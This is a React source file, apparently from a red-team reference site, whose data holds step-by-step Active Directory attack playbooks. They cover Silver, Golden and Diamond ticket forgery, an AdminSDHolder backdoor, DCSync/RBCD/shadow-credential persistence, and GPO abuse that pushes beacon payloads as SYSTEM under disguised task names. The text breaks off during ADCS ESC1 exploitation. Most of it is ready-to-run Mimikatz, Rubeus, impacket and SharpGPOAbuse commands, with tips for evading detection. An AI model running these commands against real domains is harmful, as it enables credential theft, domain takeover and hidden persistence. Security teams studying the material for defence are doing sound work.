import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'TICKET FORGERY',
    color: 'yellow',
    nodes: [
      { title: 'Silver Tickets', subtitle: 'Service TGS forge • NTLM hash', id: 'silver' },
      { title: 'Golden Tickets', subtitle: 'krbtgt hash • unlimited TGT forge', id: 'golden' },
      { title: 'Diamond Tickets', subtitle: 'Modify PAC • stealthier than golden', id: 'diamond' },
    ]
  },
  {
    header: 'PERSISTENCE',
    color: 'orange',
    nodes: [
      { title: 'AdminSDHolder Backdoor', subtitle: 'SDProp • ACL inheritance • DA persistence', id: 'adminsdholder' },
      { title: 'ACL-Based Persistence', subtitle: 'DCSync rights • RBCD • shadow creds', id: 'acl-persistence' },
      { title: 'GPO Abuse', subtitle: 'GPO create • modify • targeted deploy', id: 'gpo-abuse' },
    ]
  },
  {
    header: 'CERT & DATA',
    color: 'green',
    nodes: [
      { title: 'Forged Certificates', subtitle: 'CA key theft • PKINIT • UnPAC', id: 'forged-certs' },
      { title: 'ADCS ESC Attacks', subtitle: 'ESC1-ESC8 • cert template abuse • NTLM relay CA', id: 'adcs-esc' },
      { title: 'Data Hunting', subtitle: 'File shares • databases • docs', id: 'data-hunting' },
    ]
  },
];

const techniques = [
  {
    id: 'silver',
    title: 'Silver Tickets',
    subtitle: 'Forge a TGS ticket for a specific service using the service account\'s NTLM hash',
    tags: ['Silver Ticket', 'TGS forge', 'Mimikatz', 'Rubeus', 'impacket', 'ticketer', 'service hash'],
    accentColor: 'yellow',
    overview: 'A Silver Ticket is a forged Kerberos TGS created offline using the NTLM hash of a service account (or machine account). The KDC is never contacted — the ticket is presented directly to the target service. Scope is limited to that specific service on that specific host. The most common targets: CIFS (file access), HOST (winrs/psexec), HTTP, LDAP, MSSQL, WSMAN. Because no AS-REQ or TGS-REQ hits the DC, Silver Tickets evade many detection controls that rely on KDC event logging.',
    steps: [
      'OBTAIN HASH: get the NTLM hash of the target service account or machine account via DCSync, secretsdump, or lsadump',
      'GET DOMAIN SID: needed to construct the PAC — use whoami /user (strip last RID) or PowerView Get-DomainSID',
      'FORGE (remote): impacket ticketer.py — generates a .ccache ticket file usable directly with impacket tools from Linux',
      'FORGE (on-prem): Mimikatz kerberos::golden /service — forge and inject directly into current session with /ptt',
      'FORGE (on-prem): Rubeus silver — execute-assembly forge, /ptt injects into beacon session',
      'SERVICE TYPES: cifs (SMB shares/file access), host (winrs/psexec), http (web), ldap (AD queries), mssql, wsman (WinRM)',
      'OPSEC: tickets without corresponding AS-REQ on the DC can be detected — use with care on monitored environments',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer (from Linux)',
        code: `# ── Obtain machine account hash first ────────────────────────────────────────
# DCSync for the target computer account
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user FILESERVER$
# or: secretsdump -just-dc-ntlm → note the NT hash

# ── Forge Silver Ticket with impacket ticketer ────────────────────────────────
# Requires: domain-sid, NTLM hash of service account, spn, user to impersonate
impacket-ticketer \
  -nthash <MACHINE_OR_SERVICE_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn cifs/fileserver.corp.local \
  Administrator
# Outputs: Administrator.ccache

# ── Use the Silver Ticket ──────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass fileserver.corp.local      # CIFS
impacket-wmiexec -k -no-pass fileserver.corp.local      # WMI (host spn)
impacket-psexec  -k -no-pass fileserver.corp.local      # PSExec (host spn)

# LDAP Silver Ticket (for AD queries as DA)
impacket-ticketer \
  -nthash <DC_MACHINE_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn ldap/DC01.corp.local \
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc  # DCSync via LDAP ticket

# MSSQL Silver Ticket
impacket-ticketer \
  -nthash <SQL_SVC_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn MSSQLSvc/SQL01.corp.local:1433 \
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass SQL01.corp.local`
      },
      {
        title: 'On-Prem — Mimikatz & Rubeus (from beacon)',
        code: `# ── Step 1: Get machine account hash via DCSync ──────────────────────────────
mimikatz lsadump::dcsync /domain:corp.local /user:FILESERVER$
# Note: NTLM hash from "Hash NTLM:" line

# ── Step 2a: Forge and inject with Mimikatz ───────────────────────────────────
# Note: mimikatz uses kerberos::golden for both Golden AND Silver tickets
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /rc4:<MACHINE_NTLM_HASH> \
  /target:fileserver.corp.local \
  /service:cifs \
  /ptt
# /service options: cifs, host, rpcss, http, ldap, mssql, wsman, krbtgt

# Export to file (for later use)
mimikatz kerberos::golden \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /rc4:<HASH> /target:fileserver.corp.local /service:cifs \
  /ticket:silver_cifs.kirbi

# ── Step 2b: Forge with Rubeus ────────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe silver \
  /service:cifs/fileserver.corp.local \
  /rc4:<MACHINE_NTLM_HASH> \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /ptt /nowrap

# HOST SPN — enables winrs/psexec
execute-assembly /tools/Rubeus.exe silver \
  /service:host/fileserver.corp.local \
  /rc4:<MACHINE_NTLM_HASH> \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /ptt /nowrap

# ── Step 3: Use the Silver Ticket ────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\fileserver.corp.local\C$                 # CIFS
winrs -r:fileserver.corp.local cmd            # HOST
shell dir \\fileserver.corp.local\C$

# Get domain SID (if unknown)
Get-DomainSID                                 # PowerView
(whoami /user) -split "-" | select -SkipLast 1 | Join-String -Separator "-"`
      }
    ]
  },
  {
    id: 'golden',
    title: 'Golden Tickets',
    subtitle: 'Forge TGTs using the krbtgt hash to impersonate any user in the domain',
    tags: ['Golden Ticket', 'krbtgt', 'TGT forge', 'Mimikatz', 'Rubeus', 'impacket ticketer', 'persistence'],
    accentColor: 'yellow',
    overview: 'Golden Tickets are forged Kerberos TGTs signed with the krbtgt account\'s NTLM hash. A valid-looking TGT can request tickets for any service as any user with arbitrary group memberships. The ticket can have a 10-year validity and survives all password changes (except krbtgt rotation × 2). Impacket ticketer generates a .ccache file usable immediately from Linux; Mimikatz and Rubeus inject directly into the Windows session. The AES256 variant is harder to detect than RC4.',
    steps: [
      'OBTAIN krbtgt HASH: DCSync the krbtgt account — requires DA or replication rights; impacket-secretsdump or Rubeus dcsync',
      'FORGE (remote): impacket ticketer.py with -nthash of krbtgt and no -spn — produces a ccache TGT usable with all impacket tools',
      'FORGE (on-prem): Mimikatz kerberos::golden — forge and /ptt directly into current process; or save to .kirbi for later',
      'FORGE (on-prem): Rubeus golden — execute-assembly, outputs base64 ticket; inject with /ptt or save with /outfile',
      'GROUP MEMBERSHIP: specify arbitrary RIDs (512=DA, 519=EA, 518=Schema Admin) — ticket carries them in the PAC',
      'AES256 variant: /aes256: instead of /rc4: — harder to detect (RC4 Golden Tickets are flagged by some SIEM rules)',
      'INVALIDATION: requires rotating krbtgt password TWICE (once is insufficient — old key still valid during replication window)',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer + secretsdump (from Linux)',
        code: `# ── Step 1: Dump krbtgt hash ─────────────────────────────────────────────────
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user krbtgt
# Note the NT hash and AES256 key from output

# ── Step 2: Forge Golden Ticket (ccache format) ────────────────────────────────
# With NT hash (RC4)
impacket-ticketer \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  Administrator
# Outputs: Administrator.ccache

# With AES256 key (stealthier)
impacket-ticketer \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  Administrator

# Custom group memberships in PAC
impacket-ticketer \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,513,518,519,520 \
  FakeAdmin
# 512=DA, 513=Domain Users, 518=Schema Admins, 519=Enterprise Admins, 520=GPO Creators

# ── Step 3: Use the Golden Ticket ────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass DC01.corp.local           # Shell on DC
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc  # DCSync all hashes
impacket-wmiexec -k -no-pass DC01.corp.local          # WMI shell
nxc smb DC01.corp.local -k --use-kcache               # netexec Kerberos auth`
      },
      {
        title: 'On-Prem — Mimikatz & Rubeus (from beacon)',
        code: `# ── Step 1: DCSync krbtgt hash ───────────────────────────────────────────────
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
# Capture: "Hash NTLM:" and "* Kerberos AES256" values

# Also via Rubeus (no mimikatz process needed)
execute-assembly /tools/Rubeus.exe dcsync /domain:corp.local /user:krbtgt /dc:DC01.corp.local /nowrap

# ── Step 2a: Mimikatz — forge and inject ─────────────────────────────────────
# RC4 (NTLM hash) — simpler but detectable
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /krbtgt:<KRBTGT_NTLM_HASH> \
  /ptt

# AES256 (stealthier — preferred in monitored environments)
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /aes256:<KRBTGT_AES256_KEY> \
  /ptt

# With extra group memberships (EA = 519 for cross-domain)
mimikatz kerberos::golden \
  /user:FakeAdmin \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /krbtgt:<KRBTGT_NTLM_HASH> \
  /groups:512,513,518,519,520 \
  /ptt

# Export to .kirbi (for persistence / later import)
mimikatz kerberos::golden \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:<HASH> /ticket:golden.kirbi

# ── Step 2b: Rubeus — forge and inject ───────────────────────────────────────
execute-assembly /tools/Rubeus.exe golden \
  /rc4:<KRBTGT_NTLM_HASH> \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /groups:512 \
  /ptt /nowrap

# ── Step 3: Use the Golden Ticket ────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\DC01.corp.local\C$
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator`
      }
    ]
  },
  {
    id: 'diamond',
    title: 'Diamond Tickets',
    subtitle: 'Modify a real TGT\'s PAC — stealthier alternative to Golden Tickets',
    tags: ['Diamond Ticket', 'PAC', 'Rubeus', 'impacket', 'ticketer', 'legitimate TGT', 'stealthy persistence'],
    accentColor: 'yellow',
    overview: 'Diamond Tickets improve on Golden Tickets by starting with a legitimately KDC-issued TGT and modifying only its PAC (Privilege Attribute Certificate) to add privileged group memberships, then re-signing with the krbtgt key. The resulting ticket has a valid logon time, real KDC-issued structure, and correct key usage — defeating anomaly detection that compares ticket metadata against expected login events. Rubeus diamond handles this fully on-prem; impacket ticketer with the -old-pac flag achieves the same effect remotely.',
    steps: [
      'WHY DIAMOND: Golden Tickets are fully synthetic — anomaly detection can flag tickets with no matching AS-REQ on the DC; Diamond Tickets start with a real TGT',
      'MECHANISM: request a real TGT for a low-priv user → decrypt the PAC using krbtgt key → add privileged group RIDs → re-sign → re-encrypt → use',
      'FORGE (remote): impacket ticketer with -request flag — requests real TGT from KDC then modifies its PAC from Linux',
      'FORGE (on-prem): Rubeus diamond /tgtdeleg — uses S4U2Self delegation to get a base TGT without admin rights, then modifies PAC',
      'FORGE (on-prem): Rubeus diamond /user /password — authenticates as the target user to get real TGT, then elevates PAC',
      'GROUP RIDS: 512=Domain Admins, 519=Enterprise Admins, 518=Schema Admins — add any combination to the PAC',
      'DETECTION: still requires the krbtgt AES256/RC4 key; the real AS-REQ shows on DC logs but as the low-priv user — PAC changes are not logged',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer with real TGT base (from Linux)',
        code: `# ── Obtain krbtgt hash first (same as Golden Ticket) ─────────────────────────
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user krbtgt

# ── Diamond Ticket via impacket ticketer ──────────────────────────────────────
# The -request flag causes ticketer to first request a real TGT from the KDC,
# then modify its PAC to include the specified groups — stealthier than pure forgery

impacket-ticketer \
  -request \
  -user lowpriv \
  -password LowPrivPass \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,519 \
  Administrator
# Outputs: Administrator.ccache (PAC-modified real TGT)

# With AES256 (stealthier)
impacket-ticketer \
  -request \
  -user lowpriv \
  -password LowPrivPass \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,519 \
  Administrator

# ── Use the Diamond Ticket ─────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC01.corp.local
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc
nxc smb DC01.corp.local -k --use-kcache`
      },
      {
        title: 'On-Prem — Rubeus diamond (from beacon)',
        code: `# ── Method 1: tgtdeleg (no plaintext creds needed for base TGT) ──────────────
# Step 1: Capture a real TGT via S4U2Self delegation (works from any user context)
execute-assembly /tools/Rubeus.exe tgtdeleg /nowrap
# Outputs: base64 TGT of current user — valid, KDC-issued

# Step 2: Forge Diamond Ticket — modify PAC of the real TGT + re-sign with krbtgt
execute-assembly /tools/Rubeus.exe diamond \
  /tgtdeleg \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /krbkey:<KRBTGT_AES256_KEY> \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ptt /nowrap
# /krbkey: use AES256 (stealthier) — or /rc4: for NTLM hash

# ── Method 2: user + password (authenticates as target, modifies own PAC) ─────
execute-assembly /tools/Rubeus.exe diamond \
  /user:lowpriv \
  /password:LowPrivPass \
  /enctype:aes256 \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /krbkey:<KRBTGT_AES256_KEY> \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ptt /nowrap

# ── Verify and use ────────────────────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\DC01.corp.local\C$
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt`
      }
    ]
  },
  {
    id: 'adminsdholder',
    title: 'AdminSDHolder ACL Backdoor',
    subtitle: 'Abuse AdminSDHolder to propagate a backdoor ACL to all protected AD objects via SDProp',
    tags: ['AdminSDHolder', 'SDProp', 'ACL persistence', 'GenericAll', 'DA persistence', 'protected groups'],
    accentColor: 'orange',
    overview: `AdminSDHolder is an AD object (CN=AdminSDHolder,CN=System,DC=...) whose DACL is periodically propagated (every 60 minutes by SDProp) to all "protected" AD objects — members of Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, and others.

Attack: add GenericAll (or WriteDACL/WriteOwner) for a controlled account to AdminSDHolder's DACL. Within 60 minutes (or immediately via manual SDProp trigger), your account gains GenericAll over every Domain Admin, making this one of the stealthiest persistence mechanisms in AD — most defenders don't monitor AdminSDHolder ACL changes.

Recovery is difficult: restoring normal ACLs on protected objects is insufficient — the backdoor ACL on AdminSDHolder will repopulate them on the next SDProp cycle.`,
    steps: [
      'Add GenericAll ACE for controlled account to AdminSDHolder: PowerView Add-DomainObjectAcl targeting AdminSDHolder',
      'Wait up to 60 minutes for SDProp to propagate, or trigger manually via LDAPMod on SDProp task',
      'After propagation: your account has GenericAll over every DA, EA, SA, and other protected accounts',
      'Use GenericAll to reset DA passwords, add yourself to DA group, or DCSync',
      'Detection: monitor ACL changes on CN=AdminSDHolder,CN=System',
      'Cleanup: remove ACE from AdminSDHolder to stop re-propagation; also remove from individual protected objects',
    ],
    commands: [
      {
        title: 'AdminSDHolder backdoor via PowerView & manual SDProp trigger',
        code: `# --- ADD ACE TO ADMINSDHOLDER ---
# PowerView — add GenericAll to AdminSDHolder for attacker account
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_account \
  -Rights All \
  -Verbose

# Or specific rights (less conspicuous):
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity attacker_account \
  -Rights ResetPassword,WriteMembers

# Verify ACE was added:
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -match "ATTACKER_SID" }

# --- TRIGGER SDPROP MANUALLY (don't wait 60 min) ---
# Invoke-SDPropagator.ps1 — trigger immediately
Import-Module Invoke-SDPropagator.ps1
Invoke-SDPropagator -showProgress -TimeoutMinutes 1

# Or LDAP-trigger via .NET (invoke RunProtectAdminGroupsTask):
$ldapObj = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Domain Updates Config,CN=System,DC=corp,DC=local")
$ldapObj.Put("eDirXMLLinkRef", "eDirXMLLinkRef")
# (Simplified — use Invoke-SDPropagator for reliability)

# --- VERIFY PROPAGATION ---
# After ~60 min (or manual trigger): check DA account ACL
Get-DomainObjectAcl -Identity "CN=Administrator,CN=Users,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -match "ATTACKER_SID" }
# Should now show GenericAll on the Administrator account

# --- USE THE BACKDOOR ---
# Reset a DA's password (with GenericAll acquired via AdminSDHolder):
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
# Now authenticate as DA

# DCSync (add DCSync rights to attacker via AdminSDHolder-propagated GenericAll):
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync

# BloodHound query — find who has rights on AdminSDHolder:
# MATCH (n)-[r:GenericAll|WriteDacl|WriteOwner]->(m:Base {name:"ADMINSDHOLDER@CORP.LOCAL"}) RETURN n,r,m`
      }
    ]
  },
  {
    id: 'acl-persistence',
    title: 'ACL-Based AD Persistence',
    subtitle: 'Grant covert persistent AD rights via targeted ACL modifications — DCSync, RBCD, shadow credentials',
    tags: ['ACL persistence', 'DCSync rights', 'RBCD', 'shadow credentials', 'Resource-Based Constrained Delegation', 'WriteDACL', 'GenericAll'],
    accentColor: 'orange',
    overview: `ACL-based persistence modifies Active Directory access control lists to grant a controlled account rights that persist independently of group membership or standard privilege hierarchy. Defenders auditing group memberships will miss these.

Techniques:
1. DCSync Rights: grant DS-Replication-Get-Changes-All on the domain root — allows DCSync as a non-DA account forever
2. Resource-Based Constrained Delegation (RBCD): set msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer — allows S4U2Proxy impersonation without being in constrained delegation
3. Shadow Credentials: add a key credential (msDS-KeyCredentialLink) to a target account — authenticate as that account using PKINIT without knowing the password
4. Owner control: set yourself as Owner of a privileged object — Owners can always modify the DACL`,
    steps: [
      'DCSync backdoor: grant DS-Replication rights on domain root to a controlled low-priv account',
      'RBCD: add msDS-AllowedToActOnBehalfOfOtherIdentity on a target host pointing to a controlled machine account',
      'Shadow credentials: add a key credential to a target account via msDS-KeyCredentialLink — persistent PKINIT auth',
      'Owner modification: set controlled account as Owner of DA group, AdminSDHolder, or domain root',
      'All of these survive password resets and Group Policy changes — only reverting the ACL removes them',
    ],
    commands: [
      {
        title: 'ACL persistence — DCSync rights, RBCD, shadow credentials',
        code: `# --- DCSYNC RIGHTS BACKDOOR ---
# Grant DS-Replication-Get-Changes-All to attacker account on domain root
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity attacker_account \
  -Rights DCSync -Verbose
# Now attacker_account can DCSync even without DA group membership

# Verify:
Get-DomainObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -match "ATTACKER_SID" -and $_.ActiveDirectoryRights -match "ExtendedRight" }

# Use: DCSync as attacker_account
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt /altservice:attacker_account /dc:DC01.corp.local

# --- RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ---
# Goal: impersonate any user to a target service (e.g., CIFS/HOST on a server)
# Requires: write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# and control of a machine account (create one or use existing)

# Step 1: Create a controlled machine account (if you have MachineAccountQuota > 0)
execute-assembly /tools/Rubeus.exe asktgt /user:attacker_machine$ /password:Pass123! /domain:corp.local /nowrap
# Or use Impacket:
impacket-addcomputer corp.local/lowpriv:Password -computer-name ATTACKER_PC$ -computer-pass Pass123!

# Step 2: Set RBCD on target — allow our machine to impersonate anyone to it
Set-DomainRBCD -Identity TARGETHOST$ -DelegateFrom ATTACKER_PC$
# Or with PowerView:
$attacker_sid = Get-DomainComputer ATTACKER_PC$ | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attacker_sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes,0)
Get-DomainComputer TARGETHOST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Step 3: Get TGT for ATTACKER_PC$
execute-assembly /tools/Rubeus.exe asktgt /user:ATTACKER_PC$ /password:Pass123! /domain:corp.local /nowrap

# Step 4: S4U — impersonate DA to TARGETHOST
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<ATTACKER_PC_TGT> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGETHOST.corp.local \
  /ptt /nowrap

# Step 5: Access
ls \\TARGETHOST.corp.local\C$

# --- SHADOW CREDENTIALS ---
# Add key credential to target account — authenticate as them via PKINIT
# Requires: write access to target's msDS-KeyCredentialLink attribute

# Pywhisker (from Linux):
python3 pywhisker.py -d corp.local -u lowpriv -p Password --target targetuser --action add --filename shadow_key
# Outputs: shadow_key.pfx + shadow_key.pem

# Whisker (Windows, from beacon):
execute-assembly /tools/Whisker.exe add /target:targetuser /domain:corp.local /dc:DC01
# Outputs: Rubeus command to use the shadow credential

# Use shadow credential to get TGT:
execute-assembly /tools/Rubeus.exe asktgt \
  /user:targetuser \
  /certificate:<BASE64_CERT> \
  /password:certpassword \
  /domain:corp.local \
  /ptt /getcredentials /nowrap
# /getcredentials = UnPAC-the-Hash to get NTLM hash too`
      }
    ]
  },
  {
    id: 'gpo-abuse',
    title: 'GPO Abuse — Targeted Deployment via Group Policy',
    subtitle: 'Create or modify GPOs to deploy payloads to specific OUs, computers, or user groups without touching individual machines',
    tags: ['GPO', 'Group Policy', 'SharpGPOAbuse', 'Immediate Task', 'pyGPOAbuse', 'OU targeting', 'GPO create', 'GPO modify'],
    accentColor: 'orange',
    overview: `Group Policy Objects (GPOs) are AD objects that define configuration applied to OUs containing computers and users. If you control a GPO (or have CreateChild on a GPO container, or WriteDACL on an existing GPO), you can deploy immediate scheduled tasks, startup scripts, or computer configuration that runs with SYSTEM privileges on every machine in the linked OU.

Why GPO is powerful:
- Targets OUs: one GPO modification deploys to thousands of machines at once
- Runs as SYSTEM: computer-targeted immediate tasks run as SYSTEM without credentials
- Appears legitimate: GPOs are administrative infrastructure — rarely investigated without specific GPO audit tools
- Persistence: GPO modifications survive reboots and user logoffs; policy re-applies automatically

Tools: SharpGPOAbuse (Windows), pyGPOAbuse (Linux), PowerShell GPMC (native).`,
    steps: [
      'Enumerate GPOs: BloodHound "Find GPOs where X has modify rights" or PowerView Get-DomainGPO',
      'Check GPO permissions: Get-DomainGPOLocalGroup or Get-DomainObjectAcl on the GPO GUID',
      'If you can modify a GPO: add an Immediate Scheduled Task that runs a payload as SYSTEM on linked computers',
      'Use SharpGPOAbuse to add immediate tasks, startup scripts, or user logon scripts',
      'Target specific OUs for surgical deployment: only machines/users in the GPO-linked OU get the task',
      'Cleanup: remove the scheduled task from the GPO after callback — task deleted from all linked machines on next policy refresh',
    ],
    commands: [
      {
        title: 'GPO abuse — SharpGPOAbuse, enumeration, targeted deployment',
        code: `# --- ENUMERATION ---
# Find GPOs you can modify (BloodHound query):
# MATCH (n)-[r:GenericWrite|GenericAll|WriteDacl]->(g:GPO) WHERE n.name = "ATTACKER@CORP.LOCAL" RETURN g

# PowerView — find GPOs and their permissions
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Get-DomainGPOLocalGroup    # GPOs that modify local group membership

# Find OUs a specific GPO is linked to:
Get-DomainOU -GPLink "{GPO-GUID}" | Select-Object distinguishedname

# Find who can modify which GPOs:
Get-DomainGPO | ForEach-Object {
  $gpoPath = $_.gpcfilesyspath
  Get-DomainObjectAcl -ResolveGUIDs -Identity $_.cn | 
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll" } |
    Select-Object @{N='GPO';E={$gpoPath}},@{N='Principal';E={$_.SecurityIdentifier}}
}

# --- SHARPGPOABUSE — add immediate task via GPO ---
# Add computer-targeted immediate task (runs as SYSTEM on all linked machines)
execute-assembly /tools/SharpGPOAbuse.exe \
  --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c C:\\Windows\\Temp\\beacon.exe" \
  --GPOName "Vulnerable GPO Name" \
  --Force

# Add user-targeted logon task (runs when users in OU log in)
execute-assembly /tools/SharpGPOAbuse.exe \
  --AddUserTask \
  --TaskName "OneDriveSync" \
  --Author "CORP\\Administrator" \
  --Command "powershell.exe" \
  --Arguments "-nop -w hidden -enc BASE64PAYLOAD" \
  --GPOName "Default Domain Policy"

# Add startup script (runs at computer startup as SYSTEM)
execute-assembly /tools/SharpGPOAbuse.exe \
  --AddComputerScript \
  --ScriptName "startup.bat" \
  --ScriptContents "C:\\Windows\\Temp\\beacon.exe" \
  --GPOName "Vulnerable GPO Name"

# --- PYGPOABUSE (from Linux) ---
python3 pygpoabuse.py corp.local/Administrator:Password@DC01 \
  -gpo-id "GPO_GUID" \
  -task-name "WindowsDefenderUpdate" \
  -command "cmd.exe /c C:\\Windows\\Temp\\b.exe" \
  -user-sid "S-1-5-18"   # SYSTEM

# --- FORCE IMMEDIATE GPO REFRESH ---
# From beacon on a target machine (forces target to re-apply policy):
shell gpupdate /force

# Remote force update via WMI:
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "gpupdate /force"

# --- CLEANUP (remove task from GPO) ---
execute-assembly /tools/SharpGPOAbuse.exe --RemoveTask --TaskName "WindowsUpdate" --GPOName "Vulnerable GPO Name"`
      }
    ]
  },
  {
    id: 'adcs-esc',
    title: 'ADCS ESC Attacks — Certificate Template Exploitation',
    subtitle: 'Exploit misconfigured ADCS certificate templates for domain escalation and persistent authentication',
    tags: ['ADCS', 'ESC1', 'ESC3', 'ESC4', 'ESC6', 'ESC8', 'Certipy', 'certificate template', 'NTLM relay CA', 'PetitPotam ADCS'],
    accentColor: 'green',
    overview: `Active Directory Certificate Services (ADCS) is a frequent escalation path in enterprise environments. Misconfigurations in certificate templates allow low-privilege users to enroll certificates as privileged users or escalate to DA through certificate-based authentication.

ESC1 (Most Common): Template allows requestor to specify SubjectAltName (SAN) + enrollment for any user → enroll certificate claiming to be DA → PKINIT to get TGT + hash
ESC3: Certificate with Certificate Request Agent EKU → enroll on behalf of any user → request cert as DA
ESC4: Writable template ACL → modify template to become ESC1-vulnerable → ESC1 attack
ESC6: CA with EDITF_ATTRIBUTESUBJECTALTNAME2 flag → any template allows SAN override
ESC8: NTLM relay to HTTP ADCS endpoint (certsrv) → coerce DC auth via PetitPotam/PrinterBug → get DC certificate → DCSync

Certipy automates discovery and exploitation from Linux. Certify + Rubeus covers on-prem from beacon.`,
    steps: [
      'Enumerate vulnerable templates: Certipy find -vulnerable, or Certify.exe find /vulnerable',
      'ESC1: enroll certificate with SubjectAltName=DA UPN, use for PKINIT to get TGT',
      'ESC4: modify template ACL (if you have write access) to add ESC1-style misconfiguration, then ESC1',
      'ESC8: coerce DC NTLM auth (PetitPotam), relay to ADCS HTTP endpoint, get DC certificate, DCSync',
      'ESC6: if CA has EDITF_ATTRIBUTESUBJECTALTNAME2, add SAN to any enrollment request',
      'Convert PFX certificate to NT hash via UnPAC-the-Hash after PKINIT',
    ],
    commands: [
      {
        title: 'ADCS ESC attacks — Certipy & Certify',
        code: `# --- ENUMERATION ---
# Certipy (Linux) — find vulnerable templates and CA configurations
certipy find -u lowpriv@corp.local -p Password -dc-ip DC01 -vulnerable -stdout
# Look for: ESC1, ESC2, ESC3, ESC4, ESC6, ESC8

# Certify (on-prem from beacon)
execute-assembly /tools/Certify.exe find /vulnerable
execute-assembly /tools/Certify.exe find /enrolleeSuppliesSubject   # ESC1 indicator
execute-assembly /tools/Certify.exe cas                              # Enumerate CAs

# --- ESC1: ENROLLEE SUPPLIES SUBJECT ---
# Template allows requestor to specify the SubjectAltName (SAN)
# + low-priv users can enroll + Client Authentication EKU

# Certify — request cert as Domain Admin:
execute-assembly /tools/Certify.exe request /ca:CA.corp.local\\CORP-CA /template:VulnTemplate /altname:administrator
# Outputs: cert.pem

# Convert PEM to PFX:
